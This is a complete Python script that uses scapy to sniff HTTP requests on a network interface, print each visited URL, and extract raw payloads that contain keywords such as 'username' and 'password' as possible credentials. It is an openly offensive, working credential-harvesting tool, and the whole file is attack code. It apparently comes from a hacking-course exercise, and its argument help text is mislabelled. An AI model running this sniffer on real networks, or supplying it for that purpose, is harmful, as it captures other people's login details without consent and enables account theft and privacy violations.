#!/usr/bin/python3
import scapy.all as scapy
from scapy.layers import http
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Target IP or IP range.")
    options = parser.parse_args()

    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = [b'username', b'user', b'login', b'password', b'pass']
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >>> {url}")

        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible username/password >>> {login_info}\n\n")


options = get_arguments()
sniff(options.interface)
